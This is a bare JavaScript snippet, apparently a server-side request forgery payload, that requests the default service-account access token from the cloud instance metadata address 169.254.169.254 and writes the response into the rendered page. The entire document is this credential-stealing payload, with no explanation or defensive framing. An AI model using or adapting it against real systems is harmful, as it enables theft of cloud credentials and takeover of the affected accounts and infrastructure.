http = new XMLHttpRequest();
http.onload = function(){document.write(this.responseText);}
http.onerror = function(){document.write('failed!')}
http.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token");
http.send();
